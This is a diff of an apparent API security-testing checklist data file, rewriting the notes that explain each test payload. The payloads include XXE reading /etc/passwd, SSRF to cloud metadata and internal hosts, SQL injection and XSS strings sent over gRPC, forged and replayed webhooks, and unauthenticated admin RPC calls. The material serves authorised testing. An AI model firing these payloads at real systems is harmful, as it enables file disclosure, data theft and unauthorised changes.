+        payloadNotes: ["curl -H 'Authorization: Bearer <token>' .../users | jq '.[0]': -H authenticates the request, and the response is piped into jq '.[0]', which extracts just the first array element's raw JSON so its full field list can be compared against what the UI actually renders."],
         expectedResponse: {
           vulnerable: "The list endpoint returns extra fields (e.g. internal IDs, emails, password hashes) that aren't rendered in the UI but are present in the raw JSON.",
           safe: "The API response is limited to exactly the fields the UI displays, with no internal/sensitive fields present in the raw JSON.",
@@ -518,7 +518,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test HATEOAS links for unauthorized action exposure",
         how: "If the API returns action links (edit/delete URLs) in responses, check whether they're shown regardless of the caller's actual permission.",
         payloads: ["curl -H 'Authorization: Bearer <low_priv_token>' https://api.example.com/v1/orders/5001 | jq '._links'"],
-        payloadNotes: ["Fetches an order as a low-privileged user and inspects the HATEOAS action links returned."],
+        payloadNotes: ["curl -H 'Authorization: Bearer <low_priv_token>' .../orders/5001 | jq '._links': -H authenticates as a deliberately low-privileged user, and the response is piped into jq '._links' to isolate the HATEOAS action-link object and check if edit/delete links appear despite the caller lacking permission for them."],
         expectedResponse: {
           vulnerable: "HATEOAS links for edit/delete actions are included in the response even for users who lack permission to perform them.",
           safe: "Action links are conditionally included only when the authenticated caller actually has permission to perform that action.",
@@ -531,9 +531,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Send unexpected types/formats in path parameters (e.g. non-numeric ID) and check for verbose errors or unexpected behavior.",
         payloads: ["curl https://api.example.com/v1/users/abc", "curl https://api.example.com/v1/users/-1", "curl 'https://api.example.com/v1/users/1%00'"],
         payloadNotes: [
-          "Sends a non-numeric value in place of the expected numeric user ID.",
-          "Sends a negative number as the user ID to test boundary/validation handling.",
-          "Sends a null-byte-terminated ID to test for a parsing or validation bypass.",
+          "curl .../users/abc: substitutes the letters abc where a numeric user ID is expected, testing whether type coercion/parsing throws a raw error instead of a clean 400.",
+          "curl .../users/-1: uses -1 as the ID, testing boundary handling for negative numbers that are syntactically valid integers but semantically invalid IDs.",
+          "curl '.../users/1%00': %00 is the URL-encoded null byte appended after the ID 1, testing whether it truncates string handling in an underlying language runtime and causes a parsing or validation bypass.",
         ],
         expectedResponse: {
           vulnerable: "A non-numeric or malformed path parameter triggers a verbose stack trace, DB error, or unexpected 500 instead of a clean validation error.",
@@ -546,7 +546,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test PATCH endpoints for partial-update logic flaws",
         how: "Send a PATCH with only one field and confirm other fields aren't unintentionally reset/nulled server-side.",
         payloads: ["curl -X PATCH https://api.example.com/v1/users/1 -H 'Content-Type: application/json' -d '{\"email\":\"new@example.com\"}'"],
-        payloadNotes: ["Sends a PATCH updating only the email field to check if unrelated fields get wiped."],
+        payloadNotes: ["curl -X PATCH .../users/1 -H 'Content-Type: application/json' -d '{\"email\":\"new@example.com\"}': -X PATCH signals a partial update, -H declares the JSON content type, and -d supplies only the email field, testing whether the server's update logic incorrectly treats this like a full PUT and nulls out every other field it didn't receive."],
         expectedResponse: {
           vulnerable: "Sending a PATCH with only one field causes other unrelated fields on the record to be unintentionally cleared/reset to null.",
           safe: "A partial PATCH updates only the field(s) supplied, leaving every other field on the record unchanged.",
@@ -559,8 +559,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Confirm authorization checks are applied identically across GET/POST/PUT/DELETE for the same resource, not just one verb.",
         payloads: ["curl -H 'Authorization: Bearer <low_priv_token>' -X GET https://api.example.com/v1/orders/5001", "curl -H 'Authorization: Bearer <low_priv_token>' -X DELETE https://api.example.com/v1/orders/5001"],
         payloadNotes: [
-          "Reads an order as a low-privileged user to establish the baseline authorization check.",
-          "Attempts to delete the same order as a low-privileged user to compare enforcement across verbs.",
+          "curl -H 'Authorization: Bearer <low_priv_token>' -X GET .../orders/5001: -X GET with a low-privileged token establishes the baseline — whether reading this order is blocked or allowed.",
+          "curl -H 'Authorization: Bearer <low_priv_token>' -X DELETE .../orders/5001: the same token and resource, but -X DELETE swaps the verb, testing whether authorization is enforced consistently across verbs rather than only on GET.",
         ],
         expectedResponse: {
           vulnerable: "A low-privileged token is blocked on GET but succeeds on DELETE/PUT for the same resource, showing authorization isn't checked uniformly per verb.",
@@ -581,7 +581,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test SOAP endpoints for XXE injection",
         how: "SOAP is XML-based by design — submit standard XXE payloads inside the SOAP body.",
         payloads: ["<?xml version=\"1.0\"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body>&xxe;</soap:Body></soap:Envelope>"],
-        payloadNotes: ["Embeds an external entity referencing /etc/passwd inside a SOAP envelope body."],
+        payloadNotes: ["The <!DOCTYPE soap:Envelope [...]> block defines the entity xxe via SYSTEM \"file:///etc/passwd\", and &xxe; inside <soap:Body> references it, testing whether the SOAP XML parser resolves external entities embedded in the envelope body."],
         expectedResponse: {
           vulnerable: "The XXE payload in the SOAP body is resolved, returning file contents or triggering an out-of-band callback.",
           safe: "The SOAP/XML parser has external entity processing disabled, so the DOCTYPE/entity is ignored or the request is rejected.",
@@ -593,7 +593,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test SOAP action header manipulation",
         how: "Modify the SOAPAction header to an unexpected operation name and check if the server routes it inconsistently with the body.",
         payloads: ["curl -X POST -H 'SOAPAction: \"GetAdminUser\"' -H 'Content-Type: text/xml' --data-binary @request.xml https://api.example.com/service.asmx"],
-        payloadNotes: ["Sets the SOAPAction header to a different operation than the one implied by the SOAP body."],
+        payloadNotes: ["curl -X POST -H 'SOAPAction: \"GetAdminUser\"' -H 'Content-Type: text/xml' --data-binary @request.xml .../service.asmx: -H sets SOAPAction to \"GetAdminUser\", an operation name that doesn't match the actual operation encoded in request.xml sent via --data-binary, testing whether the server routes based on the header instead of validating it against the body."],
         expectedResponse: {
           vulnerable: "Changing the SOAPAction header routes the request to a different operation than the one implied by the SOAP body, causing an inconsistent/unintended action.",
           safe: "The server derives the actual operation from the SOAP body itself (or validates SOAPAction against it), ignoring or rejecting a mismatched header.",
@@ -605,7 +605,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test WSDL exposure and information disclosure",
         how: "Fetch the WSDL definition (?wsdl) to map the full operation surface, including undocumented/internal operations.",
         payloads: ["/service.asmx?wsdl"],
-        payloadNotes: ["Fetches the WSDL definition to enumerate all exposed SOAP operations."],
+        payloadNotes: ["/service.asmx?wsdl: the ?wsdl query parameter appended to the service endpoint requests its self-describing WSDL document, which enumerates every exposed SOAP operation including undocumented ones."],
         expectedResponse: {
           vulnerable: "The WSDL is publicly fetchable and lists internal/undocumented operations beyond what's used by the client application.",
           safe: "The WSDL is not exposed publicly, or only lists the operations that are actually intended for external/documented use.",
@@ -617,7 +617,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test SOAP for XML injection via unescaped element values",
         how: "Inject XML special characters into element values to see if malformed/altered request structure is accepted.",
         payloads: ["</value><value>injected</value>"],
-        payloadNotes: ["Injects a closing/opening tag pair to try to break out of the intended XML element."],
+        payloadNotes: ["</value><value>injected</value>: closes the current <value> element early and opens a new one containing injected, testing whether an unescaped element value lets an attacker break out of the intended tag and inject additional/altered XML structure."],
         expectedResponse: {
           vulnerable: "Injected XML tags break out of the intended element and are parsed as additional/altered structure, changing the request's meaning server-side.",
           safe: "XML special characters in element values are properly escaped, so injected markup is treated as literal text rather than parsed structure.",
@@ -629,7 +629,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test WS-Security signature/encryption bypass",
         how: "If WS-Security is used, test whether a modified but unsigned/re-signed request is still accepted.",
         payloads: ["curl -X POST -H 'Content-Type: text/xml' --data-binary @unsigned-request.xml https://api.example.com/service.asmx"],
-        payloadNotes: ["Sends a SOAP request with a stripped or invalid WS-Security signature."],
+        payloadNotes: ["curl -X POST -H 'Content-Type: text/xml' --data-binary @unsigned-request.xml .../service.asmx: --data-binary sends a request body (unsigned-request.xml) whose WS-Security signature element has been stripped or re-signed with an invalid key, testing whether the server still processes it as authentic."],
         expectedResponse: {
           vulnerable: "A request with a stripped or re-signed WS-Security signature is still accepted and processed as if it were validly signed.",
           safe: "The server rejects any request whose WS-Security signature doesn't verify against the expected key/certificate, returning a security fault.",
@@ -649,7 +649,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Enumerate gRPC services via reflection",
         how: "If server reflection is enabled, list all available services/methods, including undocumented internal ones.",
         payloads: ["grpcurl -plaintext <host>:<port> list"],
-        payloadNotes: ["Queries the gRPC reflection service to list all available services and methods."],
+        payloadNotes: ["grpcurl -plaintext <host>:<port> list: -plaintext disables TLS for the connection, and the list command calls the server's reflection service to enumerate every registered service and method, including undocumented internal ones."],
         expectedResponse: {
           vulnerable: "Server reflection is enabled and lists all services/methods, including internal ones never exposed through documented client code.",
           safe: "Reflection is disabled in production (list returns an error/empty), so the service/method surface isn't enumerable without prior knowledge.",
@@ -662,8 +662,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Call sensitive gRPC methods directly with a low-privileged or missing credential to check for BFLA-style issues.",
         payloads: ["grpcurl -plaintext -d '{\"user_id\":1}' <host>:<port> admin.AdminService/DeleteUser", "grpcurl -plaintext -H 'authorization: Bearer <low_priv_token>' <host>:<port> admin.AdminService/ListAllUsers"],
         payloadNotes: [
-          "Calls the admin DeleteUser RPC directly with no credential supplied.",
-          "Calls the admin ListAllUsers RPC using a low-privileged bearer token.",
+          "grpcurl -plaintext -d '{\"user_id\":1}' <host>:<port> admin.AdminService/DeleteUser: -d sends the request message {\"user_id\":1} with no authorization metadata header at all, directly invoking the admin.AdminService/DeleteUser RPC method to test if it requires a credential.",
+          "grpcurl -plaintext -H 'authorization: Bearer <low_priv_token>' <host>:<port> admin.AdminService/ListAllUsers: -H attaches a low-privileged bearer token as gRPC metadata while invoking the admin.AdminService/ListAllUsers method, testing whether it enforces an elevated role.",
         ],
         expectedResponse: {
           vulnerable: "A low-privileged or missing credential still allows calling admin-only RPC methods (e.g. DeleteUser succeeds and returns OK).",
@@ -677,8 +677,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Fuzz string/bytes fields in the protobuf message the same way as REST JSON fields for backend injection flaws.",
         payloads: ["grpcurl -plaintext -d '{\"query\":\"'\\'' OR 1=1--\"}' <host>:<port> UserService/Search", "grpcurl -plaintext -d '{\"name\":\"<script>alert(1)</script>\"}' <host>:<port> UserService/Create"],
         payloadNotes: [
-          "Sends a SQL injection payload in the query field of a gRPC Search call.",
-          "Sends an XSS payload in the name field of a gRPC Create call.",
+          "grpcurl -plaintext -d '{\"query\":\"'\\'' OR 1=1--\"}' <host>:<port> UserService/Search: -d sends a message whose query field contains a quote-breakout and OR 1=1-- tautology, invoking UserService/Search to test if the protobuf string field flows into a raw SQL query.",
+          "grpcurl -plaintext -d '{\"name\":\"<script>alert(1)</script>\"}' <host>:<port> UserService/Create: -d sends a name field containing a <script> XSS payload to the UserService/Create RPC, testing if the value is later rendered unescaped downstream.",
         ],
         expectedResponse: {
           vulnerable: "Fuzzed string/bytes fields trigger a backend injection effect (DB error, XSS reflected downstream, or altered query behavior).",
@@ -691,7 +691,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test gRPC-Web gateway for REST-to-gRPC translation flaws",
         how: "Compare authorization behavior of the gRPC-Web/HTTP gateway against direct gRPC calls for inconsistencies.",
         payloads: ["curl -H 'Authorization: Bearer <low_priv_token>' -X POST https://api.example.com/grpc-web/UserService/DeleteUser -d '{\"id\":1}'"],
-        payloadNotes: ["Calls the DeleteUser method through the gRPC-Web/HTTP gateway using a low-privileged token."],
+        payloadNotes: ["curl -H 'Authorization: Bearer <low_priv_token>' -X POST .../grpc-web/UserService/DeleteUser -d '{\"id\":1}': -H supplies a low-privileged token, -X POST hits the HTTP-translated gRPC-Web path for UserService/DeleteUser, and -d sends the target id, testing whether the REST-to-gRPC gateway applies the same authorization as a direct gRPC call."],
         expectedResponse: {
           vulnerable: "The gRPC-Web/HTTP gateway allows an action that direct gRPC calls block (or vice versa), showing the translation layer applies weaker authorization.",
           safe: "Authorization behavior is identical between the gRPC-Web gateway and direct gRPC calls for the same low-privileged credential.",
@@ -704,8 +704,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Confirm the server rejects plaintext connections if mTLS is supposed to be mandatory.",
         payloads: ["grpcurl -plaintext <host>:<port> list", "openssl s_client -connect <host>:<port>"],
         payloadNotes: [
-          "Attempts a plaintext (non-TLS) gRPC reflection call to see if it's accepted.",
-          "Opens a raw TLS connection to inspect the certificate/handshake requirements.",
+          "grpcurl -plaintext <host>:<port> list: -plaintext explicitly forces an unencrypted connection to the gRPC port, testing whether the server accepts and serves reflection data over it despite mTLS supposedly being mandatory.",
+          "openssl s_client -connect <host>:<port>: -connect opens a raw TLS handshake to the target, letting you inspect the presented certificate and whether the server demands a client certificate (mTLS) to complete the handshake.",
         ],
         expectedResponse: {
           vulnerable: "A plaintext (non-TLS) connection to the gRPC port succeeds and serves data, showing mTLS isn't actually enforced.",
@@ -727,8 +727,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Send a webhook payload with a missing/invalid signature and confirm the receiving endpoint rejects it.",
         payloads: ["curl -X POST https://client.example.com/webhook -H 'Content-Type: application/json' -d '{\"event\":\"payment.success\",\"amount\":0}'", "curl -X POST https://client.example.com/webhook -H 'X-Signature: invalid' -d '{\"event\":\"payment.success\"}'"],
         payloadNotes: [
-          "Sends a fabricated webhook event with no signature header at all.",
-          "Sends a webhook event with a deliberately invalid signature value.",
+          "curl -X POST .../webhook -H 'Content-Type: application/json' -d '{\"event\":\"payment.success\",\"amount\":0}': -d sends a fabricated payment.success event with amount 0 and no X-Signature header at all, testing whether the receiver processes unsigned payloads.",
+          "curl -X POST .../webhook -H 'X-Signature: invalid' -d '{\"event\":\"payment.success\"}': -H sets X-Signature to the literal string invalid, testing whether the receiver actually verifies the signature value rather than just checking the header's presence.",
         ],
         expectedResponse: {
           vulnerable: "A webhook payload with a missing or invalid signature is still processed by the receiving endpoint as if it were legitimate.",
@@ -741,7 +741,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test webhook replay protection",
         how: "Resend a previously valid webhook payload and check if it's processed again (no timestamp/nonce validation).",
         payloads: ["curl -X POST https://client.example.com/webhook -H 'X-Signature: <captured_valid_signature>' -H 'Content-Type: application/json' -d @captured-payload.json"],
-        payloadNotes: ["Resends a previously captured, validly-signed webhook payload to test replay handling."],
+        payloadNotes: ["curl -X POST .../webhook -H 'X-Signature: <captured_valid_signature>' -H 'Content-Type: application/json' -d @captured-payload.json: -H replays a genuinely valid, previously-captured signature and -d @captured-payload.json resends the exact original body byte-for-byte, testing if the receiver detects and rejects an already-processed event."],
         expectedResponse: {
           vulnerable: "Resending a previously captured valid webhook payload is processed again, duplicating the event (e.g. a payment credited twice).",
           safe: "The receiver tracks processed event IDs/timestamps and rejects or no-ops a replayed payload it has already handled.",
@@ -754,8 +754,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Set a webhook destination to an internal address and confirm the server doesn't blindly deliver to it.",
         payloads: ["{\"webhook_url\": \"http://169.254.169.254/latest/meta-data/\"}", "{\"webhook_url\": \"http://internal-service.local:8080/admin\"}"],
         payloadNotes: [
-          "Sets the webhook destination to the cloud metadata endpoint to test for SSRF.",
-          "Sets the webhook destination to an internal-only hostname to test for SSRF.",
+          "{\"webhook_url\": \"http://169.254.169.254/latest/meta-data/\"}: webhook_url is set to the cloud metadata service IP 169.254.169.254, testing if the server will deliver a callback request to that internal address on the user's behalf.",
+          "{\"webhook_url\": \"http://internal-service.local:8080/admin\"}: webhook_url targets an internal-only hostname (internal-service.local) and admin path on port 8080, testing if delivery reaches private network services not meant to be externally addressable.",
         ],
         expectedResponse: {
           vulnerable: "A webhook URL pointed at an internal/metadata address causes the server to make the request and the response/side-effect confirms delivery to that internal target.",
@@ -769,8 +769,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Review whether integration tokens (Slack, GitHub, etc.) are stored securely and scoped minimally, not over-broadly requested.",
         payloads: ["curl -H 'Authorization: Bearer <integration_token>' https://slack.com/api/auth.test", "curl -H 'Authorization: Bearer <integration_token>' https://api.github.com/user"],
         payloadNotes: [
-          "Uses the stored Slack integration token to check its validity and identity.",
-          "Uses the stored GitHub integration token to check what scope/access it actually has.",
+          "curl -H 'Authorization: Bearer <integration_token>' https://slack.com/api/auth.test: -H sends the stored Slack token to Slack's auth.test endpoint, which confirms the token's validity and identifies the workspace/user it's tied to.",
+          "curl -H 'Authorization: Bearer <integration_token>' https://api.github.com/user: -H sends the stored GitHub token to the /user endpoint, whose response headers (X-OAuth-Scopes) reveal exactly what scopes/permissions the stored token actually carries.",
         ],
         expectedResponse: {
           vulnerable: "The stored integration token has broader scopes than needed (e.g. full admin access) or is retrievable in plaintext from the application.",
@@ -792,8 +792,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Trigger malformed requests and check if internal stack traces or DB errors are returned in the JSON error body.",
         payloads: ["curl -X POST https://api.example.com/v1/users -d 'malformed{json'", "curl 'https://api.example.com/v1/users/999999999999999999999'"],
         payloadNotes: [
-          "Sends intentionally broken JSON to trigger a parser error response.",
-          "Sends an oversized numeric ID to trigger an integer overflow or DB error.",
+          "curl -X POST .../users -d 'malformed{json': -d sends the deliberately invalid string malformed{json as the body, testing whether the JSON parser's error response leaks a stack trace instead of a clean validation message.",
+          "curl '.../users/999999999999999999999': the path uses a 21-digit numeric ID far exceeding typical integer bounds, testing whether it triggers an integer-overflow exception or raw database error instead of a graceful 400/404.",
         ],
         expectedResponse: {
           vulnerable: "Malformed input triggers a raw stack trace, SQL error, or internal file path disclosed in the JSON error response.",
@@ -806,7 +806,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test for missing security headers on API responses",
         how: "Verify API responses set appropriate Content-Type and don't allow unintended browser rendering (X-Content-Type-Options).",
         payloads: ["curl -I https://api.example.com/v1/users"],
-        payloadNotes: ["Fetches response headers to check for Content-Type and X-Content-Type-Options."],
+        payloadNotes: ["curl -I https://api.example.com/v1/users: -I fetches only the response headers (no body), which are inspected for a correct Content-Type and the presence of X-Content-Type-Options: nosniff."],
         expectedResponse: {
           vulnerable: "Responses are missing Content-Type/X-Content-Type-Options, allowing a browser to MIME-sniff and render API JSON as HTML in some contexts.",
           safe: "Responses consistently set the correct Content-Type and X-Content-Type-Options: nosniff, preventing browser MIME-sniffing.",
@@ -819,8 +819,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Check if the API reflects arbitrary Origins with credentials allowed, exposing authenticated data to any website.",
         payloads: ["curl -H 'Origin: https://evil.com' -I https://api.example.com/v1/users", "curl -H 'Origin: https://evil.com' -H 'Cookie: session=<valid_session>' -I https://api.example.com/v1/account"],
         payloadNotes: [
-          "Sends a request with an untrusted Origin header to see if it's reflected in the CORS headers.",
-          "Sends an authenticated request with an untrusted Origin to test if credentialed CORS exposes account data.",
+          "curl -H 'Origin: https://evil.com' -I .../users: -H sets Origin to an untrusted third-party domain, and -I checks the response headers to see if Access-Control-Allow-Origin reflects evil.com back verbatim.",
+          "curl -H 'Origin: https://evil.com' -H 'Cookie: session=<valid_session>' -I .../account: adds a valid session cookie alongside the untrusted Origin, testing whether the server combines a reflected origin with Access-Control-Allow-Credentials: true, which would let evil.com read authenticated account data via a browser.",
         ],
         expectedResponse: {
           vulnerable: "The API reflects an arbitrary Origin in Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true, letting any website read authenticated responses.",
@@ -834,8 +834,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Confirm old API versions mentioned in docs/changelogs are properly decommissioned, not silently still functional with weaker checks.",
         payloads: ["curl https://api.example.com/v1/users", "curl https://api.example.com/api/legacy/users"],
         payloadNotes: [
-          "Requests the current API version to establish a baseline response.",
-          "Requests a documented-as-retired legacy endpoint to see if it's still functional.",
+          "curl https://api.example.com/v1/users: requests the current, supported v1 path to establish a baseline response for comparison.",
+          "curl https://api.example.com/api/legacy/users: requests the /api/legacy/ path, a route documented in changelogs as retired, to check whether it's still functional and skipping newer security checks.",
         ],
         expectedResponse: {
           vulnerable: "An old/legacy API version documented as retired still responds successfully and may skip security checks added later.",
@@ -849,8 +849,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Check if endpoints intended for internal service-to-service calls (often under /internal/ or /admin/) are reachable from the public internet.",
         payloads: ["curl https://api.example.com/internal/health", "curl https://api.example.com/admin/debug/vars"],
         payloadNotes: [
-          "Requests an internal health-check path directly from outside the network.",
-          "Requests an internal debug/metrics path directly from outside the network.",
+          "curl https://api.example.com/internal/health: requests the /internal/health path, meant only for service-to-service health checks, directly from outside the network to test if it's publicly reachable.",
+          "curl https://api.example.com/admin/debug/vars: requests /admin/debug/vars, a typical Go expvar-style debug/metrics path, directly from the public internet to test for exposed internal diagnostics.",
         ],
         expectedResponse: {
           vulnerable: "Internal-only paths like /internal/health or /admin/debug/vars are reachable directly from the public internet without any network restriction.",
@@ -863,7 +863,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test for sensitive data in API response caching",
         how: "Confirm Cache-Control: no-store is set for endpoints returning authenticated/sensitive data.",
         payloads: ["curl -I https://api.example.com/v1/account | grep -i cache-control"],
-        payloadNotes: ["Fetches response headers and filters for the Cache-Control directive."],
+        payloadNotes: ["curl -I .../account | grep -i cache-control: -I fetches only response headers, piped into grep -i (case-insensitive) matching cache-control, to check whether the sensitive account endpoint sets Cache-Control: no-store."],
         expectedResponse: {
           vulnerable: "Authenticated/sensitive responses are cacheable (missing Cache-Control: no-store), risking exposure via shared caches or browser history.",
           safe: "Responses carrying sensitive/authenticated data explicitly set Cache-Control: no-store, preventing caching by intermediaries or the browser.",
